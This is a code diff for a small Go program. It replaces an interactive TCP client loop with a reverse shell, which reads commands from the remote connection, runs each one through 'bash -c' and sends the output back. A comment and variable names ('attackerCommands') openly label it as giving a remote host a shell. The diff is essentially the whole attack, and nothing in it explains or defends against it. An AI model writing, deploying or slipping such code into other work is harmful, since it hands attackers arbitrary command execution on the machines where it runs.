@@ -3,9 +3,10 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"log"
 	"net"
 	"os"
-	"strings"
+	"os/exec"
 )
 
 func main() {
@@ -21,19 +22,32 @@ func main() {
 		fmt.Println(err)
 		return
 	}
+	/*
+		for {
+			reader := bufio.NewReader(os.Stdin)
+			fmt.Print(">> ")
+			text, _ := reader.ReadString('\n')
+			fmt.Fprintf(c, text+"\n")
+
+			message, _ := bufio.NewReader(c).ReadString('\n')
+			fmt.Print("->: " + message)
+			if strings.TrimSpace(string(text)) == "STOP" {
+				fmt.Println("TCP client exiting...")
+				return
+			}
+		} */
+
+	//COMMANDS TO GIVE REMOST HOST A SHELL
 
 	for {
-		reader := bufio.NewReader(os.Stdin)
-		fmt.Print(">> ")
-		text, _ := reader.ReadString('\n')
-		fmt.Fprintf(c, text+"\n")
-
-		message, _ := bufio.NewReader(c).ReadString('\n')
-		fmt.Print("->: " + message)
-		if strings.TrimSpace(string(text)) == "STOP" {
-			fmt.Println("TCP client exiting...")
-			return
+		attackerCommands, _ := bufio.NewReader(c).ReadString('\n')
+		cmd := exec.Command("bash", "-c", attackerCommands)
+		if err != nil {
+			log.Fatalln(err)
 		}
+		out, _ := cmd.CombinedOutput()
+
+		c.Write(out)
 	}
 }
 
